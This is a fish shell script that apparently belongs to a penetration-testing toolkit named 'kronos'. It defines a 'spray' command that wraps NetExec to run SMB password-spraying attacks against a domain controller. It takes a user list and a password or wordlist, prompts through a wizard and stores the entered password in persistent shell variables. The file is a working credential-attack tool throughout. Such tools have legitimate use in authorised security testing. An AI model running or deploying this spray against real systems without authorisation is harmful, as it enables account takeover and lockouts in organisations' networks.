# description: Password spray using nxc smb
function __kronos_spray --description "Password spray using nxc smb"
    set -l wizard 0
    if test (count $argv) -eq 0
        set wizard 1
    end

    argparse t/target= h/help q/quiet u/userlist= p/password= X/edit-cmd w/wizard -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos spray [OPTIONS]"
        echo ""
        echo "Password spray against a target using nxc smb."
        echo ""
        echo "Options:"
        echo "  -t, --target IP     Target DC IP or Hostname"
        echo "  -u, --userlist FILE Path to username list (defaults to valid_users.txt)"
        echo "  -p, --password PASS Password or path to password list to spray"
        echo "  -X, --edit-cmd      Inspect and edit the command before execution"
        echo "  -q, --quiet         Skip prompts and use fallbacks"
        echo "  -h, --help          Show this help message"
        return 0
    end

    set -l target $_flag_target
    if test -z "$target"; set target $argv[1]; end
    set -l userlist $_flag_userlist
    set -l password $_flag_password

    if not set -q _flag_quiet
        if test "$wizard" -eq 1 -o -z "$target"; or set -q _flag_wizard
            set_color cyan; echo "[*] Starting Spray wizard..."; set_color normal

            set -l def_target "$__KRONOS_CACHE_SPRAY_TARGET"
            set -l src_target "Cache"
            if test -z "$def_target"
                set def_target "$TGT"; set src_target "TGT"
                if test -z "$def_target"; set def_target "$TGT_DC_IP"; set src_target "TGT_DC_IP"; end
                if test -z "$def_target"; set def_target "$TGT_DC"; set src_target "TGT_DC"; end
                if test -z "$def_target"; set def_target "$TGT_HOSTS[1]"; set src_target "TGT_HOSTS"; end
            end
            if test -n "$target"; set def_target "$target"; set src_target "CLI Arg"; end
            set target (__kronos_ask "Target DC IP/Hostname" "$def_target" "$src_target"); or return 1
            set -U __KRONOS_CACHE_SPRAY_TARGET "$target"

            set -l def_domain "$__KRONOS_CACHE_SPRAY_DOMAIN"
            set -l src_domain "Cache"
            if test -z "$def_domain"
                set def_domain "$TGT_HOSTS[1]"; set src_domain "TGT_HOSTS"
                if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; set src_domain "TGT_DC_DOMAIN"; end
            end
            if test -n "$domain"; set def_domain "$domain"; set src_domain "CLI Arg"; end
            set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
            set -U __KRONOS_CACHE_SPRAY_DOMAIN "$domain"

            set -l def_userlist "$__KRONOS_CACHE_SPRAY_USERLIST"
            set -l src_userlist "Cache"
            if test -z "$def_userlist"; set def_userlist "valid_users.txt"; set src_userlist "Default"; end
            if test -n "$userlist"; set def_userlist "$userlist"; set src_userlist "CLI Arg"; end
            set userlist (__kronos_ask "User List Path" "$def_userlist" "$src_userlist"); or return 1
            set -U __KRONOS_CACHE_SPRAY_USERLIST "$userlist"

            set -l def_pass "$__KRONOS_CACHE_SPRAY_PASS"
            set -l src_pass "Cache"
            if test -n "$password"; set def_pass "$password"; set src_pass "CLI Arg"; end
            set password (__kronos_ask "Password (or wordlist path) to spray" "$def_pass" "$src_pass"); or return 1
            set -U __KRONOS_CACHE_SPRAY_PASS "$password"
        end
    else
        # Fallbacks
        if test -z "$target"; set target "$__KRONOS_CACHE_SPRAY_TARGET"; end
        if test -z "$target"; set target "$TGT"; end
        if test -z "$userlist"; set userlist "$__KRONOS_CACHE_SPRAY_USERLIST"; end
        if test -z "$userlist"; set userlist "valid_users.txt"; end
        if test -z "$password"; set password "$__KRONOS_CACHE_SPRAY_PASS"; end
    end

    if test -z "$target"; echo "error: target is required"; return 1; end
    if test -z "$password"; echo "error: password is required"; return 1; end

    if not test -f "$userlist"
        echo "error: userlist not found at $userlist." >&2
        return 1
    end

    set -l nxc_cmd "nxc smb \"$target\" -u \"$userlist\" -p \"$password\" --continue-on-success"
    if test -n "$TGT_DC_DOMAIN"
        set nxc_cmd "$nxc_cmd -d \"$TGT_DC_DOMAIN\""
    end

    if set -q _flag_edit_cmd; set nxc_cmd (__kronos_edit_cmd "$nxc_cmd"); or return 1; end

    __kronos_check_dep nxc; or return 1

    echo "[*] Running password spray against $target..."
    eval $nxc_cmd
end
